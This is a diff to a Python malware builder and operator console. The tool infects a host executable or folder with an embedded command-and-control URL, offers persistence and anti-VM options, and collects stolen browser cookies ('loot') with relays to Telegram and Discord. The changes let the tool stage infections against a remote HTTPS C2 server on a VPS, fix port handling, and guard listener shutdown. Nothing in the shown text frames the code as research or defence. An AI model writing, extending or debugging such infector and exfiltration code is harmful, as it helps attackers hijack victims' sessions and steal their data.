@@ -750,6 +750,18 @@ def start_listener(port, telegram=None, discord=None):
         log("[*] listener bound on 0.0.0.0 — LAN address: http://%s:%d/" % (lan, port))
     return proc
 
+def _remote_tls_c2(c2_url, run_local):
+    """True when the C2 is an https endpoint served elsewhere (Caddy on the VPS).
+    auto must not try to bind that port locally with its plain-HTTP listener."""
+    if not c2_url or run_local:
+        return False
+    try:
+        info = parse_c2_url(c2_url)
+    except ValueError:
+        return False
+    return bool(info.get("tls")) and not info.get("loopback")
+
+
 def check_c2_reachable(c2_url, timeout=4):
     """Best-effort TCP connect to the C2 host:port. Honest about its limits:
     from inside the LAN a failure can be a missing port-forward, a local
@@ -757,7 +769,8 @@ def check_c2_reachable(c2_url, timeout=4):
     only proves the port answers on this network path."""
     try:
         u = urllib.parse.urlparse(c2_url)
-        host, port = u.hostname, (u.port or 80)
+        host = u.hostname
+        port = u.port or (443 if u.scheme == "https" else 80)
         if host in ("127.0.0.1", "localhost"):
             return True, "local"
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -1695,12 +1708,17 @@ def run_one(host_path, mode, run_local, port, telegram, discord, persist, no_ant
         c2_url = "http://127.0.0.1:%d/" % port
         log("[+] C2 URL (local test): %s" % c2_url)
 
-    # 3. start listener
-    log("\n[3/5] starting listener...")
-    listener = start_listener(port, telegram, discord)
-    if not listener:
-        log("[-] could not start listener")
-        return
+    # 3. start listener (https C2 already runs on the VPS -- nothing to bind here)
+    remote_c2 = _remote_tls_c2(c2_url, run_local)
+    if remote_c2:
+        log("\n[3/5] listener: remote TLS C2, local listener not started")
+        listener = None
+    else:
+        log("\n[3/5] starting listener...")
+        listener = start_listener(port, telegram, discord)
+        if not listener:
+            log("[-] could not start listener")
+            return
     # 3.5 is the C2 actually answering on that address? (best-effort, see docstring)
     ok, info = check_c2_reachable(c2_url)
     if not ok:
@@ -1720,7 +1738,8 @@ def run_one(host_path, mode, run_local, port, telegram, discord, persist, no_ant
         if mode == "folder":
             out_path, orig_exe = build_infected_folder(host_path, c2_url, persist, no_anti_vm)
             if not out_path:
-                listener.terminate()
+                if listener is not None:
+                    listener.terminate()
                 return
             folder_name = os.path.basename(os.path.abspath(host_path))
             log("\n" + "=" * 60)
@@ -1736,7 +1755,8 @@ def run_one(host_path, mode, run_local, port, telegram, discord, persist, no_ant
             log("[+] C2 URL embedded: %s" % c2_url)
     except Exception as ex:
         log("[-] infection failed: %s" % ex)
-        listener.terminate()
+        if listener is not None:
+            listener.terminate()
         return
 
     # 5. run locally or wait
@@ -1756,6 +1776,9 @@ def run_one(host_path, mode, run_local, port, telegram, discord, persist, no_ant
                     log("[+] original .exe restored after error")
 
     # 6. wait for cookies
+    if remote_c2:
+        log("[*] staged for %s; loot lands on the C2 host (rsync from there)" % c2_url)
+        return
     try:
         wait_for_cookies(timeout=300)
     except KeyboardInterrupt:
@@ -2042,12 +2065,17 @@ def main():
         elif cfg.get("discord"):
             log("[*] Discord relay: disabled (checkbox off, key saved in config)")
 
-    # 4. start listener
-    log("\n[4/5] starting listener...")
-    listener = start_listener(port, telegram, discord)
-    if not listener:
-        log("[-] could not start listener")
-        return 1
+    # 4. start listener (https C2 already runs on the VPS -- nothing to bind here)
+    remote_c2 = _remote_tls_c2(c2_url, run_local)
+    if remote_c2:
+        log("\n[4/5] listener: remote TLS C2, local listener not started")
+        listener = None
+    else:
+        log("\n[4/5] starting listener...")
+        listener = start_listener(port, telegram, discord)
+        if not listener:
+            log("[-] could not start listener")
+            return 1
 
     # 5. infect
     log("\n[5/5] infecting...")
@@ -2055,7 +2083,8 @@ def main():
         if mode == "folder":
             out_path, orig_exe = build_infected_folder(host_path, c2_url, persist, no_anti_vm)
             if not out_path:
-                listener.terminate()
+                if listener is not None:
+                    listener.terminate()
                 return 1
             folder_name = os.path.basename(os.path.abspath(host_path))
             log("\n" + "=" * 60)
@@ -2111,7 +2140,8 @@ def main():
             log("=" * 60)
     except Exception as ex:
         log("[-] infection failed: %s" % ex)
-        listener.terminate()
+        if listener is not None:
+            listener.terminate()
         return 1
 
     # 6. run locally or wait for cookies
@@ -2131,6 +2161,9 @@ def main():
                     log("[+] original .exe restored after error")
 
     # 7. wait for cookies
+    if remote_c2:
+        log("[*] staged for %s; loot lands on the C2 host (rsync from there)" % c2_url)
+        return 0
     try:
         wait_for_cookies(timeout=300)
     except KeyboardInterrupt:
